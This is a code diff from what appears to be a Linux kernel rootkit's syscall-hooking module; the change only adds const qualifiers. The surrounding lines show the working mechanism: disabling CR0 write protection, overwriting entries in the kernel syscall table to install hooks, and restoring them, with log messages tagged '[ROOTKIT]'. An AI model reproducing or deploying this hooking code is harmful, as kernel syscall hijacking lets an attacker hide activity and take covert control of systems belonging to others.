@@ -42,7 +42,7 @@ static inline unsigned long unprotect_memory(void)
  *
  * @param ul_orig_cr0 The original value of the CR0 register
  */
-static inline void protect_memory(unsigned long ul_orig_cr0)
+static inline void protect_memory(const unsigned long ul_orig_cr0)
 {
     cr0_write(ul_orig_cr0);
 }
@@ -86,12 +86,12 @@ int init_hooking(void)
     return 0;
 }
 
-sysfun_t get_syscall_entry(size_t sz_syscall_nr)
+sysfun_t get_syscall_entry(const size_t sz_syscall_nr)
 {
     return p_syscall_table[sz_syscall_nr];
 }
 
-void set_syscall_entry(size_t sz_syscall_nr, sysfun_t new_sysfun)
+void set_syscall_entry(const size_t sz_syscall_nr, const sysfun_t new_sysfun)
 {
     unsigned long ul_orig_cr0 = unprotect_memory();
 
@@ -100,7 +100,7 @@ void set_syscall_entry(size_t sz_syscall_nr, sysfun_t new_sysfun)
     protect_memory(ul_orig_cr0);
 }
 
-int hook_syscall(hook_t *p_hook)
+int hook_syscall(hook_t *const p_hook)
 {
     pr_info("[ROOTKIT] Hooking syscall %zu\n", p_hook->sz_syscall_nr);
 
@@ -110,14 +110,14 @@ int hook_syscall(hook_t *p_hook)
     return 0;
 }
 
-void unhook_syscall(const hook_t *p_hook)
+void unhook_syscall(const hook_t *const p_hook)
 {
     pr_info("[ROOTKIT] Unhooking syscall %zu\n", p_hook->sz_syscall_nr);
 
     set_syscall_entry(p_hook->sz_syscall_nr, *(p_hook->p_orig_sysfun));
 }
 
-int hook_syscalls(hook_t p_hooks[], size_t sz_count)
+int hook_syscalls(hook_t p_hooks[], const size_t sz_count)
 {
     int i_err = 0;
     size_t i;
@@ -140,7 +140,7 @@ int hook_syscalls(hook_t p_hooks[], size_t sz_count)
     return 0;
 }
 
-void unhook_syscalls(const hook_t p_hooks[], size_t sz_count)
+void unhook_syscalls(const hook_t p_hooks[], const size_t sz_count)
 {
     size_t i;
     for (i = 0; i < sz_count; ++i) {
